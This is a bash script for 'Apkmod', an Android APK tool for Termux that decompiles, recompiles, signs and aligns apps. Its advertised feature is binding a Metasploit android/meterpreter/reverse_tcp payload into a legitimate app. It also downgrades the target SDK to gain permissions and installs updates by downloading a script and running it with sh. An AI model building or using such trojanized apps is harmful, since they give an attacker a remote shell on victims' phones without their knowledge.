#!/usr/bin/env bash

########################################
# Project : Apkmod     		       #
# Author  : Lokesh @Hax4us	       #
# Email   : lkpandey950@gmail.com      #
########################################

unset _JAVA_OPTIONS
CWD=$(pwd)
LOC=$(which apkmod)
VERSION="2.2"
AAPT=""

#colors
cyan='\033[1;36m'                      
green='\033[1;32m'                     
red='\033[1;31m'
yellow='\033[1;33m' 
blue='\033[1;34m'                      
purple='\033[1;35m'
reset='\033[0m'

usage() {
	printf "${yellow}Usage: apkmod [option] [/path/to/input.apk] -o [/path/to/output.apk] [EXTRAARGS]
    ${purple}valid options are:${blue}
    -v              print version
    -d              For decompiling
    -r              For recompiling
    -R              recompile + sign
    -s              For signing
    -b              For binding payload
    -o              Specify output file or directory
    -V              verbose output
    -z              for zipalign
    --no-res        prevents decompiling of resources
    --no-smali      prevents dessambly of dex files
    --no-assets     prevents decoding of unknown assets file
    --frame-path    The folder location where
    framework files should be stored/read from
    --enable-perm   Enable all permissions in binded payload
    --to-java       Decode [dex,apk,zip] to java
    --deobf         Can use along with --to-java for obfuscated code
    ${yellow}Example:
    ${blue}apkmod -b /sdcard/apps/play.apk -o /sdcard/apps/binded_play.apk LHOST=127.0.0.1 LPORT=4444
    ${purple}bind the payload with play.apk and saves output in given directory.
    ${green}Apkmod is like a bridge between your termux and 
    alpine by which you can easily decompile recompile signapk and 
    even bind the payload using metasploit\n${reset}"
}

enable_perm() {
	tmp_dir=$(mktemp -d)
	decompile ${1} ${tmp_dir} --no-src --no-assets
	for i in minSdkVersion targetSdkVersion; do
		sed -i "s/$i.*/$i: '22'/" $tmp_dir/apktool.yml
	done
	recompile ${tmp_dir} ${2}
	signapk ${2} temp.apk
	mv temp.apk ${2}
	rm -r $tmp_dir
	print_status "Done"
}

error_msg() {
	printf "${red}[!] ${yellow}${1}${reset}\n"
}

print_status() {
	printf "${blue}[*] ${green}${1}\n${reset}"
}

file_exist() {
	if [ ! -e "${1}" ]; then
		error_msg "file (${1}) does not exist"
		exit 1
	fi
}

dir_exist() {
	if [ ! -d "${1}" ]; then
		error_msg "directory (${1}) does not exist"
		exit 1
	fi
}

decompile() {
	local vbs_arg=""
	print_status "Decompiling ${1}"    
	if [ "${VERBOSE}" = "yes" ]; then
		vbs_arg="-v"
	fi
	apktool ${NO_ASSETS} ${NO_RES} ${NO_SMALI} ${vbs_arg} d -f ${1} -o ${2} -p ${FRAMEPATH:-$HOME/.apkmod/framework}
	rm -f $HOME/.apkmod/framework/1.apk
	if [ ! -e ${2} ]; then
		error_msg "Can't decompile, take screenshot and open a issue on github"
		exit 1
	fi
	print_status "Decompiled into ${2}"
}

recompile() {
	local vbs_arg=""
	print_status "Recompiling ${1}"
	if [ "${VERBOSE}" = "yes" ]; then
		vbs_arg="-v"
	fi
	apktool ${vbs_arg} b $AAPT -o ${2} ${1}
	if [ ! -e ${2} ]; then
		error_msg "Try again with -a option\nBut if still can't recompile, take screenshot and open a issue on github"
		exit 1
	fi
	print_status "Recompiled to ${2}"
	if [ "${IS_SIGN}" = "yes" ]; then
		signapk ${2} ${2%.*}_signed.apk
	fi
}

signapk() {
	print_status "Signing ${1}"

	apksigner sign --in $1 --out $2 --ks-type PKCS12 --ks ~/.apkmod/apkmod.p12 --ks-pass pass:apkmod

	if [ ! -e ${2} ]; then
		error_msg "Can't sign, take screenshot and open a issue on github"
		exit 1
	fi

	print_status "Signed Successfully"
}

#########################
# Bind payload with APK #
#########################

bindapk() {
	print_status "Binding ${3}"
	msfvenom -x ${3} -p android/meterpreter/reverse_tcp LHOST=${1} LPORT=${2} --platform android --arch dalvik AndroidMeterpreterDebug=true AndroidWakelock=true -o ${4}
	if [ ! -e ${4} ]; then
		error_msg "can't bind, take screenshot and open a issue on github"
		exit 1
	fi
	print_status "Binded to ${4}"
}

zipAlign() {
	print_status "Note : never use zipalign with signed APK"
	print_status "aligning APK..."
	zipalign -f 4 ${1} ${2}
	if [ ! -e ${4} ]; then
		error_msg "can't align APK"
		exit 1
	fi
	print_status "aligned successfully"
}

dextojava() {
	print_status "Decoding started..."
	jadx -d $2 $1 $DEOBF $NO_RES $NO_SRC
}

#########################
# Validate User's input #
#########################

validate_input() {
	if [ "${1}" = "-b" ]; then
		if [ "$#" -ne 5 ]; then
			usage
			exit 1
		fi
		file_exist "${2}"
		dir_exist "${3%\/*}"
	fi
	if [ ! "${1}" = "-b" -a "$#" -ne 3 ]; then
		usage
		exit 1
	fi

	if [ "${1}" = "-d" -o "${1}" = "-s" -o "${1}" = "--enable-perm" -o "$1" = "-d2j" ]; then
		file_exist "${2}"
		dir_exist "${3%\/*}"
	fi
	if [ "${1}" = "-r" ]; then
		dir_exist "${2}"
		dir_exist "${3%\/*}"
	fi
}

###############################
# do automatic update check & #
# ask for update if available #
###############################

update() {
	temp=$(curl -L -s https://github.com/Hax4us/Apkmod/raw/master/apkmod.sh | grep -w "VERSION=" | head -n1)
	C_VERSION="$temp"
        N_VERSION=$(grep '^VERSION=' $LOC)
check_for_update() {
        if [[ ${C_VERSION} == ${N_VERSION} ]];then
        update_log="Apkmod already updated."
        else
        update_log="Apkmod update available."
        fi
}
	if [ "${1}" != "-u" ]; then
		check_for_update
		print_status "$update_log"
		[ 1 -eq $(echo "${C_VERSION} != ${N_VERSION}" | bc -l) ] && print_status "Update is available, run [ apkmod -u ] for update" && exit 1
	fi
	if [ "${1}" = "-u" ]; then
		check_for_update
		print_status "$update_log"
		if [[ ${C_VERSION} != ${N_VERSION} ]];then
		rm -f setup.sh
		if [ "$2" = "--with-alpine" ]; then
		print_status "$update_log"
			ARGS=$2
		else
			ARGS=--without-alpine
		fi
wget https://raw.githubusercontent.com/Hax4us/Apkmod/master/setup.sh && sh setup.sh $ARGS
	fi
    fi
}

####################
# Apkmod Installer #
####################

installer() {
		rm -f setup.sh
		wget https://raw.githubusercontent.com/Hax4us/Apkmod/master/setup.sh && sh setup.sh
}

##############
#    MAIN    #
##############

checknet() {
# check for update only if net is ON
wget -q --spider http://google.com
if [[ $? -eq 0 ]];then
pwd &> /dev/null
else
printf "${red}The connection was error 404.\n${blue}Aokmod -h for help !\n${reset}"
exit 0
fi
}

while getopts ":z:d:r:s:b:o:hivuVR:-:" opt; do
    case $opt in
        d)
            ACTION="decompile"
            ARG="-d"
            in_abs_path=$(readlink -m ${OPTARG})
            ;;
        r)
            ACTION="recompile"
            ARG="-r"
            in_abs_path=$(readlink -m ${OPTARG})
            ;;
        s)
            ACTION="signapk"
            ARG="-s"
            in_abs_path=$(readlink -m ${OPTARG})
            ;;
        b)
            ACTION="bindapk"
            ARG="-b"
            in_abs_path=$(readlink -m ${OPTARG})
            LHOST=$(echo "$@" | sed -e "s/ /\\n/g" | grep -i LHOST | cut -d "=" -f2)
            LPORT=$(echo "$@" | sed -e "s/ /\\n/g" | grep -i LPORT | cut -d "=" -f2)
            ;;
        o)
            out_abs_path=$(readlink -m ${OPTARG})
            ;;
        h)
            usage
            exit 0
            ;;

	i)
	    checknet
	    printf "${yellow}Installing Apkmod Properly...${reset}\n"
	    installer
	    exit 0
	    ;;

        v)
            printf "${yellow}${VERSION}\n${reset}"
            exit 0
            ;;
        u)
	    checknet
	    update "-${opt}" "$2"
            exit 0
            ;;
        V)
            VERBOSE="yes"
            ;;
        -)
            case $OPTARG in
                no-res)
                    NO_RES="--no-res    "
                    ;;
                no-smali)
                    NO_SMALI="--no-src"
                    ;;
                no-assets)
                    NO_ASSETS="--no-assets"
                    ;;
                frame-path*)
                    FRAMEPATH="${OPTARG#*=}"
                    ;;
                enable-perm*)
                    ACTION="enable_perm"
                    ARG="--enable-perm"
                    in_abs_path=$(readlink -m ${OPTARG#*=})
                    ;;
                deobf)
                    DEOBF="--deobf"
                    ;;
                to-java*)
                    ACTION="dextojava"
                    ARG="-d2j"
                    in_abs_path=$(readlink -m ${OPTARG#*=})
                    ;;
            esac
            ;;
        R)
            ACTION="recompile"
            ARG="-r"
            in_abs_path=$(readlink -m ${OPTARG})
            IS_SIGN="yes"
            ;;
        z)
            ACTION="zipAlign"
            ARG="-z"
            in_abs_path=$(readlink -m ${OPTARG})
            ;;
        \?)
            error_msg "Invalid option: -$OPTARG"
            exit 1
            ;;
        :)
            error_msg "option -$OPTARG requires an argument"
            exit 1
            ;;
    esac
done

## Lets validate user's input
if [ "${ARG}" = "-d" ]; then
    validate_input ${ARG} ${in_abs_path} ${out_abs_path}
elif [ "${ARG}" = "-r" ]; then
    validate_input ${ARG} ${in_abs_path} ${out_abs_path}
elif [ "${ARG}" = "-s" ]; then
    validate_input ${ARG} ${in_abs_path} ${out_abs_path}
elif [ "${ARG}" = "-b" ]; then
    validate_input ${ARG} ${in_abs_path} ${out_abs_path} ${LHOST} ${LPORT}
elif [ "${ARG}" = "-z" ]; then
    validate_input ${ARG} ${in_abs_path} ${out_abs_path}
elif [ "${ARG}" = "--enable-perm" ]; then
    validate_input ${ARG} ${in_abs_path} ${out_abs_path}
elif [ "$ARG" = "-d2j" ]; then
    validate_input $ARG $in_abs_path $out_abs_path
fi

## Lhost or lport will be ignored for all actions except bindapk
${ACTION} ${LHOST} ${LPORT} ${in_abs_path} ${out_abs_path} ${NO_RES} ${NO_SMALI} ${NO_ASSETS}
